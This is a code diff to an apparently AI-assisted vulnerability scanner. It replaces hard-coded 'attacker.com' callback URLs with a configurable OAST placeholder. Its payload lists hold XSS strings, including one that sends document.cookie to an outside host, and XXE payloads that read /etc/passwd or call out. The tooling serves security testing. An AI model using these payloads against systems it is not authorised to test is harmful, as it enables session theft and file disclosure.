@@ -11,12 +11,23 @@ logger = get_logger(__name__)
 
 class AIPayloadGenerator:
     """Generate intelligent security testing payloads using AI."""
-    
+
+    # Placeholder domain for out-of-band (OOB) callback payloads.
+    # Users MUST replace this with their own OAST server (e.g., Burp Collaborator,
+    # interact.sh, or a self-hosted callback listener) before running scans.
+    # Using a domain you don't control risks leaking target data to third parties.
+    OAST_CALLBACK_URL = "{CALLBACK_URL}"
+
     def __init__(self, ai_manager, config: Dict):
         """Initialize the AI payload generator."""
         self.ai_manager = ai_manager
         self.config = config
         self.payload_config = config.get('vulnerability_scanner', {}).get('payload_generation', {})
+
+        # Allow users to configure their own OAST callback URL
+        callback_url = config.get('scanner', {}).get('oast_callback_url', '')
+        if callback_url:
+            self.OAST_CALLBACK_URL = callback_url
         
     def generate_payloads(self, context: Dict) -> Dict[str, List[str]]:
         """
@@ -121,7 +132,7 @@ Return only the payloads, one per line, without explanations."""
             "<iframe src=javascript:alert('XSS')>",
             "<body onload=alert('XSS')>",
             "javascript:alert('XSS')",
-            "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
+            f"<script>fetch('{self.OAST_CALLBACK_URL}?c='+document.cookie)</script>",
             "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
             "\"><script>alert(String.fromCharCode(88,83,83))</script>",
             "<svg><script>alert&#40;'XSS')</script>",
@@ -173,7 +184,7 @@ Return only the payloads, one per line, without explanations."""
         """Generate XXE payloads."""
         default_payloads = [
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
+            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.OAST_CALLBACK_URL}/xxe">]><foo>&xxe;</foo>',
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
         ]
         
